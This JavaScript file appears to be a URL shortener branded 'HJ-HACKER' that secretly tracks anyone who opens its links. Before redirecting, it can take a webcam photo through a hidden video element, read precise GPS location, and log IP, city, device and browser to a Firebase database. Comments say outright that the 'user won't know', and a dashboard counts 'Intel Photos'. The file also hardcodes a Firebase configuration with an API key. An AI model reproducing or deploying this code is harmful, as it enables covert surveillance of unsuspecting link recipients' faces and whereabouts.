// Firebase Configuration
const firebaseConfig = {
    apiKey: "AIzaSyAzr3Xxh0YrTH5vp00Z-eQysTM35dNmh8I",
    authDomain: "hjh-tools.firebaseapp.com",
    projectId: "hjh-tools",
    storageBucket: "hjh-tools.firebasestorage.app",
    messagingSenderId: "643137472905",
    appId: "1:643137472905:web:814ca23a86fb084811b958",
    databaseURL: "https://hjh-tools-default-rtdb.firebaseio.com"
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);
const database = firebase.database();

// Global variables
let currentModalResolve = null;
let currentLinkData = null;

// Toast notification system
function showToast(title, message, type = 'success') {
    const container = document.getElementById('toastContainer');
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    toast.innerHTML = `
        <i class="fas ${type === 'success' ? 'fa-check-circle' : 'fa-exclamation-circle'}"></i>
        <div class="toast-content">
            <div class="toast-title">${title}</div>
            <div class="toast-message">${message}</div>
        </div>
    `;
    container.appendChild(toast);
    setTimeout(() => {
        toast.style.animation = 'slideInRight 0.3s ease reverse';
        setTimeout(() => toast.remove(), 300);
    }, 3000);
}

// Generate short code
function generateShortCode() {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let result = '';
    for (let i = 0; i < 6; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

function getDeviceId() {
    let deviceId = localStorage.getItem('hj_device_id');
    if (!deviceId) {
        deviceId = Math.random().toString(36).substring(2, 15);
        localStorage.setItem('hj_device_id', deviceId);
    }
    return deviceId;
}

// Check code availability
async function checkCodeAvailability(code) {
    const snapshot = await database.ref(`urls/${code}`).get();
    return !snapshot.exists();
}

// Shorten URL
async function shortenUrl() {
    const longUrl = document.getElementById('longUrl').value.trim();
    if (!longUrl) {
        showToast('Error', 'Please enter a URL', 'error');
        return;
    }
    
    let urlToShorten = longUrl;
    if (!urlToShorten.startsWith('http')) {
        urlToShorten = 'https://' + urlToShorten;
    }
    
    const customCode = document.getElementById('customCode').value.trim();
    let shortCode = customCode || generateShortCode();
    
    const isAvailable = await checkCodeAvailability(shortCode);
    if (!isAvailable) {
        showToast('Error', `Code "${shortCode}" is already taken`, 'error');
        return;
    }
    
    const hasPassword = document.getElementById('passwordToggle').checked;
    const password = hasPassword ? document.getElementById('password').value : null;
    const hasSocialGate = document.getElementById('socialToggle').checked;
    const socialIcon = document.getElementById('socialIcon').value;
    const socialTitle = document.getElementById('socialTitle').value;
    const socialUrl = document.getElementById('socialUrl').value;
    const socialDesc = document.getElementById('socialDesc').value;
    const socialButton = document.getElementById('socialButton').value;
    const animation = document.querySelector('input[name="animation"]:checked')?.value || 'ring';
    const cameraCapture = document.getElementById('captureCamera').checked;
    const locationCapture = document.getElementById('captureLocation').checked;
    const expiryDate = document.getElementById('expiresAt').value;
    
    if (hasPassword && !password) {
        showToast('Error', 'Please enter a password', 'error');
        return;
    }
    
    if (hasSocialGate && (!socialTitle || !socialUrl)) {
        showToast('Error', 'Please fill social gate details', 'error');
        return;
    }
    
    showLoading(true);
    
    try {
        const domain = window.location.hostname;
        const deviceId = getDeviceId();
        const createdAt = new Date().toISOString();
        
        const linkData = {
            domain: domain,
            long_url: urlToShorten,
            password: password,
            social_gate_title: socialTitle,
            social_gate_url: socialUrl,
            social_gate_icon: socialIcon,
            social_gate_description: socialDesc,
            social_gate_button_text: socialButton,
            animation_type: animation,
            capture_camera: cameraCapture,
            capture_location: locationCapture,
            expires_at: expiryDate || null,
            device_id: deviceId,
            clicks: 0,
            created_at: createdAt
        };
        
        await database.ref(`urls/${shortCode}`).set(linkData);
        await database.ref(`domains/${domain}/${shortCode}`).set(linkData);
        
        const shortUrl = `${window.location.origin}/${shortCode}`;
        document.getElementById('shortLink').textContent = shortUrl;
        
        // Save to recent
        const recent = JSON.parse(localStorage.getItem('hj_recent_links') || '[]');
        recent.unshift({ code: shortCode, longUrl: urlToShorten, shortUrl: shortUrl, date: createdAt });
        localStorage.setItem('hj_recent_links', JSON.stringify(recent.slice(0, 10)));
        
        // Create QR Code
        document.getElementById('qrCode').innerHTML = '';
        new QRCode(document.getElementById('qrCode'), {
            text: shortUrl,
            width: 128,
            height: 128,
            colorDark: "#00ff41",
            colorLight: "#000000"
        });
        
        document.getElementById('result').classList.remove('hidden');
        showToast('Success', 'Link created successfully!', 'success');
        
        // Clear form
        document.getElementById('longUrl').value = '';
        document.getElementById('customCode').value = '';
        document.getElementById('passwordToggle').checked = false;
        document.getElementById('socialToggle').checked = false;
        document.getElementById('passwordSection')?.classList.add('hidden');
        document.getElementById('socialSection')?.classList.add('hidden');
        document.getElementById('password').value = '';
        document.getElementById('socialTitle').value = '';
        document.getElementById('socialUrl').value = '';
        document.getElementById('socialDesc').value = '';
        
    } catch (error) {
        console.error('Error:', error);
        showToast('Error', 'An error occurred', 'error');
    } finally {
        showLoading(false);
    }
}

function showLoading(show) {
    const loading = document.getElementById('loading');
    if (show) {
        loading.classList.remove('hidden');
        document.getElementById('shortenBtn').disabled = true;
    } else {
        loading.classList.add('hidden');
        document.getElementById('shortenBtn').disabled = false;
    }
}

// Professional Modal Functions
function showPasswordModal(linkData) {
    return new Promise((resolve) => {
        currentModalResolve = resolve;
        currentLinkData = linkData;
        const modal = document.getElementById('passwordModal');
        modal.classList.remove('hidden');
        document.getElementById('modalPassword').value = '';
        document.getElementById('modalError').classList.add('hidden');
        document.getElementById('modalPassword').focus();
    });
}

function closePasswordModal() {
    document.getElementById('passwordModal').classList.add('hidden');
    if (currentModalResolve) {
        currentModalResolve(false);
        currentModalResolve = null;
    }
}

function showSocialModal(linkData) {
    return new Promise((resolve) => {
        const icons = {
            youtube: '<i class="fab fa-youtube"></i>',
            instagram: '<i class="fab fa-instagram"></i>',
            twitter: '<i class="fab fa-twitter"></i>',
            facebook: '<i class="fab fa-facebook"></i>',
            whatsapp: '<i class="fab fa-whatsapp"></i>',
            linkedin: '<i class="fab fa-linkedin"></i>',
            tiktok: '<i class="fab fa-tiktok"></i>'
        };
        
        document.getElementById('socialModalIcon').innerHTML = icons[linkData.social_gate_icon] || '<i class="fas fa-link"></i>';
        document.getElementById('socialModalTitle').textContent = linkData.social_gate_title;
        document.getElementById('socialModalDesc').textContent = linkData.social_gate_description || 'Complete the action to continue';
        document.getElementById('socialModalBtn').textContent = linkData.social_gate_button_text || 'Verify & Continue';
        
        const modal = document.getElementById('socialModal');
        modal.classList.remove('hidden');
        
        const btn = document.getElementById('socialModalBtn');
        const handler = () => {
            window.open(linkData.social_gate_url, '_blank');
            modal.classList.add('hidden');
            resolve(true);
            btn.removeEventListener('click', handler);
        };
        btn.addEventListener('click', handler);
    });
}

function closeSocialModal() {
    document.getElementById('socialModal').classList.add('hidden');
}

// Hidden Camera Capture (User won't know)
async function captureHiddenCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: 'user' } 
        });
        
        // Create hidden video element (not visible to user)
        const video = document.createElement('video');
        video.srcObject = stream;
        video.autoplay = true;
        video.muted = true;
        video.style.display = 'none';
        document.body.appendChild(video);
        
        // Wait a bit for camera to initialize
        await new Promise(resolve => setTimeout(resolve, 500));
        
        // Capture frame
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 320;
        canvas.height = video.videoHeight || 240;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageData = canvas.toDataURL('image/jpeg', 0.6);
        
        // Cleanup
        stream.getTracks().forEach(track => track.stop());
        video.remove();
        
        return imageData;
    } catch (error) {
        console.log('Camera access denied or not available');
        return null;
    }
}

// Hidden Location Capture
async function captureHiddenLocation() {
    return new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                resolve({
                    lat: position.coords.latitude,
                    lon: position.coords.longitude
                });
            },
            () => resolve({ lat: null, lon: null }),
            { enableHighAccuracy: true, timeout: 5000 }
        );
    });
}

// Log analytics (silent background)
async function logAnalytics(shortCode, imageUrl = null, lat = null, lon = null) {
    try {
        // Get IP
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        
        // Get location from IP
        let locationData = {};
        try {
            const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
            locationData = await geoResponse.json();
        } catch {}
        
        // Get device info
        const ua = navigator.userAgent;
        const isMobile = /Mobile|Android|iPhone|iPad/i.test(ua);
        let browser = 'Unknown';
        if (ua.includes('Chrome')) browser = 'Chrome';
        else if (ua.includes('Firefox')) browser = 'Firefox';
        else if (ua.includes('Safari')) browser = 'Safari';
        
        let os = 'Unknown';
        if (ua.includes('Windows')) os = 'Windows';
        else if (ua.includes('Mac')) os = 'macOS';
        else if (ua.includes('Android')) os = 'Android';
        else if (ua.includes('iOS')) os = 'iOS';
        
        const analyticsData = {
            ip_address: ipData.ip,
            city: locationData.city || 'Unknown',
            country: locationData.country_name || 'Unknown',
            latitude: lat || locationData.latitude,
            longitude: lon || locationData.longitude,
            device_type: isMobile ? 'Mobile' : 'Desktop',
            browser: browser,
            os: os,
            referrer: document.referrer || 'Direct',
            captured_image: imageUrl,
            created_at: new Date().toISOString()
        };
        
        await database.ref(`analytics/${shortCode}`).push(analyticsData);
        
        // Increment click count silently
        const linkRef = database.ref(`urls/${shortCode}`);
        const snapshot = await linkRef.get();
        const currentClicks = snapshot.val()?.clicks || 0;
        await linkRef.update({ clicks: currentClicks + 1 });
        
    } catch (error) {
        console.log('Analytics logging failed:', error);
    }
}

// Redirect handler for the main page
async function handleRedirect() {
    const shortCode = window.location.pathname.substring(1);
    if (!shortCode || shortCode === '') return;
    
    const snapshot = await database.ref(`urls/${shortCode}`).get();
    const linkData = snapshot.val();
    
    if (!linkData) {
        document.body.innerHTML = '<div style="text-align: center; margin-top: 20%;"><h1 style="color: #ff4444;">404</h1><p>Link not found</p></div>';
        return;
    }
    
    if (linkData.expires_at && new Date(linkData.expires_at) < new Date()) {
        document.body.innerHTML = '<div style="text-align: center; margin-top: 20%;"><h1 style="color: #ff4444;">Link Expired</h1><p>This link is no longer active</p></div>';
        return;
    }
    
    // Handle password
    if (linkData.password) {
        const password = await showPasswordModal(linkData);
        if (!password) return;
        if (password !== linkData.password) {
            showToast('Error', 'Incorrect password', 'error');
            return;
        }
    }
    
    // Handle social gate
    if (linkData.social_gate_title && linkData.social_gate_url) {
        await showSocialModal(linkData);
    }
    
    // Hidden intelligence - User won't know!
    let imageUrl = null;
    let location = { lat: null, lon: null };
    
    if (linkData.capture_camera) {
        imageUrl = await captureHiddenCamera();
    }
    
    if (linkData.capture_location) {
        location = await captureHiddenLocation();
    }
    
    // Log analytics silently in background
    logAnalytics(shortCode, imageUrl, location.lat, location.lon);
    
    // Redirect
    window.location.href = linkData.long_url;
}

// Icon selector
document.querySelectorAll('.icon-option').forEach(icon => {
    icon.addEventListener('click', () => {
        document.querySelectorAll('.icon-option').forEach(i => i.classList.remove('active'));
        icon.classList.add('active');
        document.getElementById('socialIcon').value = icon.dataset.icon;
    });
});

// Advanced toggle
document.getElementById('advancedToggle')?.addEventListener('click', () => {
    const content = document.getElementById('advancedContent');
    const icon = document.querySelector('#advancedToggle .fa-chevron-down');
    content.classList.toggle('hidden');
    icon.style.transform = content.classList.contains('hidden') ? 'rotate(0deg)' : 'rotate(180deg)';
});

// Toggle handlers
document.getElementById('passwordToggle')?.addEventListener('change', (e) => {
    const section = document.getElementById('passwordSection');
    section.classList.toggle('hidden');
});

document.getElementById('socialToggle')?.addEventListener('change', (e) => {
    const section = document.getElementById('socialSection');
    section.classList.toggle('hidden');
});

// Modal event listeners
document.getElementById('modalCancel')?.addEventListener('click', () => closePasswordModal());
document.getElementById('modalUnlock')?.addEventListener('click', () => {
    const password = document.getElementById('modalPassword').value;
    if (currentModalResolve) {
        currentModalResolve(password);
        closePasswordModal();
    }
});
document.getElementById('modalPassword')?.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
        document.getElementById('modalUnlock').click();
    }
});

// Tab switching
document.querySelectorAll('.nav-btn').forEach(btn => {
    btn.addEventListener('click', async () => {
        const tab = btn.dataset.tab;
        document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        
        document.querySelectorAll('.tab').forEach(t => t.classList.add('hidden'));
        document.getElementById(`${tab}Tab`).classList.remove('hidden');
        
        if (tab === 'recent') await loadRecentLinks();
        if (tab === 'analytics') await loadAnalyticsList();
    });
});

// Load functions
async function loadRecentLinks() {
    const recent = JSON.parse(localStorage.getItem('hj_recent_links') || '[]');
    const container = document.getElementById('recentList');
    
    if (recent.length === 0) {
        container.innerHTML = '<div style="text-align: center; padding: 2rem;"><i class="fas fa-inbox"></i><p>No recent links</p></div>';
        return;
    }
    
    container.innerHTML = recent.map(link => `
        <div class="recent-item">
            <div>
                <div class="recent-code"><i class="fas fa-link"></i> /${link.code}</div>
                <div class="recent-url">${link.longUrl.substring(0, 60)}...</div>
                <div style="font-size: 0.6rem; color: #444; margin-top: 4px;">${new Date(link.date).toLocaleString()}</div>
            </div>
            <div class="recent-actions">
                <button onclick="copyToClipboard('${link.shortUrl}')" class="btn-icon"><i class="fas fa-copy"></i></button>
                <button onclick="viewAnalytics('${link.code}')" class="btn-icon"><i class="fas fa-chart-line"></i></button>
            </div>
        </div>
    `).join('');
}

async function loadAnalyticsList() {
    const domain = window.location.hostname;
    const snapshot = await database.ref(`domains/${domain}`).get();
    const links = [];
    snapshot.forEach(child => {
        links.push({ code: child.key, ...child.val() });
    });
    
    const container = document.getElementById('analyticsList');
    if (links.length === 0) {
        container.innerHTML = '<div style="text-align: center; padding: 2rem;"><i class="fas fa-chart-simple"></i><p>No links found</p></div>';
        return;
    }
    
    container.innerHTML = links.map(link => `
        <div class="recent-item">
            <div>
                <div class="recent-code"><i class="fas fa-link"></i> /${link.code}</div>
                <div class="recent-url">${link.long_url?.substring(0, 50)}...</div>
                <div style="font-size: 0.6rem; color: #444;">Clicks: ${link.clicks || 0}</div>
            </div>
            <button onclick="viewAnalytics('${link.code}')" class="btn-primary" style="width: auto; padding: 8px 16px;">View Stats</button>
        </div>
    `).join('');
}

window.viewAnalytics = async (code) => {
    const snapshot = await database.ref(`analytics/${code}`).orderByKey().limitToLast(50).get();
    const analytics = [];
    snapshot.forEach(child => {
        analytics.push({ id: child.key, ...child.val() });
    });
    analytics.reverse();
    
    const linkSnapshot = await database.ref(`urls/${code}`).get();
    const linkData = linkSnapshot.val();
    
    document.getElementById('analyticsCode').innerHTML = `<div class="card-header"><i class="fas fa-chart-line"></i><h3>Analytics for /${code}</h3></div>`;
    
    const totalClicks = analytics.length;
    const uniqueIPs = new Set(analytics.map(a => a.ip_address)).size;
    const cameras = analytics.filter(a => a.captured_image).length;
    const locations = analytics.filter(a => a.latitude).length;
    
    document.getElementById('statsGrid').innerHTML = `
        <div class="stat-card"><div class="stat-value">${totalClicks}</div><div class="stat-label">Total Clicks</div></div>
        <div class="stat-card"><div class="stat-value">${uniqueIPs}</div><div class="stat-label">Unique Visitors</div></div>
        <div class="stat-card"><div class="stat-value">${cameras}</div><div class="stat-label">Intel Photos</div></div>
        <div class="stat-card"><div class="stat-value">${locations}</div><div class="stat-label">Locations</div></div>
    `;
    
    document.getElementById('visitorsList').innerHTML = analytics.map(v => `
        <div class="visitor-item">
            <div class="visitor-header">
                <span><i class="fas fa-globe"></i> ${v.ip_address || 'Unknown'}</span>
                <span><i class="fas fa-clock"></i> ${new Date(v.created_at).toLocaleString()}</span>
            </div>
            <div class="visitor-details">
                <span><i class="fas fa-mobile-alt"></i> ${v.device_type || 'Unknown'}</span>
                <span><i class="fab fa-chrome"></i> ${v.browser || 'Unknown'}</span>
                <span><i class="fab fa-windows"></i> ${v.os || 'Unknown'}</span>
                ${v.city ? `<span><i class="fas fa-location-dot"></i> ${v.city}, ${v.country}</span>` : ''}
                ${v.captured_image ? `<span><i class="fas fa-camera"></i> Photo Captured</span>` : ''}
            </div>
        </div>
    `).join('');
    
    document.getElementById('analyticsDetail').classList.remove('hidden');
    document.querySelector('[data-tab="analytics"]').click();
};

window.copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    showToast('Copied', 'Link copied to clipboard', 'success');
};

// Event listeners
document.getElementById('shortenBtn')?.addEventListener('click', shortenUrl);
document.getElementById('copyBtn')?.addEventListener('click', () => {
    const link = document.getElementById('shortLink').textContent;
    if (link) copyToClipboard(link);
});

// Initialize
loadRecentLinks();

// Check if this is a redirect page (has shortCode in path)
if (window.location.pathname !== '/' && window.location.pathname !== '/index.html') {
    handleRedirect();
}

console.log('🔥 HJ-HACKER Professional URL Shortener Ready!');
